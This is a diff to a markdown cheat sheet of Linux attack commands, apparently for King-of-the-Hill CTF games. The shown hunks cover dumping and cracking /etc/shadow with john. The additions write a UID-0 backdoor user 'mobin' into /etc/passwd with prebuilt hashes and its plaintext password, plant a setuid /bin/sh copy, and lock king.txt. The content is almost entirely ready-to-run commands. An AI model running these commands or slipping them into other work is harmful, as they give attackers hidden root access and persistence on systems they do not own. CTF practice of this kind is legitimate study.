@@ -129,7 +129,7 @@ cat /etc/shadow
 unshadow /etc/passwd /etc/shadow > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-### Writable /etc/shadow OR  /etc/passwd ✡️
+### Writable /etc/shadow OR /etc/passwd ✡️
 ```bash
 mkpasswd -m sha-512 <new-password>
 OR
@@ -137,9 +137,13 @@ openssl passwd <password>
 OR
 openssl passwd -1 -salt <username> <password>
 
-change root password from /etc/<shadow|passwd> OR Add to end the /etc/<shadow|passwd>
+change root password from /etc/shadow OR Add to end the /etc/passwd
+Format add to /etc/passwd = <username>:<passwordhash>:0:0:root:/root:/bin/bash
 
-Format add = <username>:<passwordhash>:0:0:root:/root:/bin/bash
+echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
+echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
+password=Mobin@
+
 su <username> ( Switch to new root user )
 ```
 
@@ -257,6 +261,12 @@ echo "solcoteh" >| /root/king.txt
 lessecho "solcoteh" > /root/king.txt
 set -o noclobber /root/king.txt
 sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
+
+cp /bin/sh /home/sh && chmod u+s /home/sh
+
+echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
+echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
+password=Mobin@
 ```
 ### Not_Be-king ✅
 ```bash
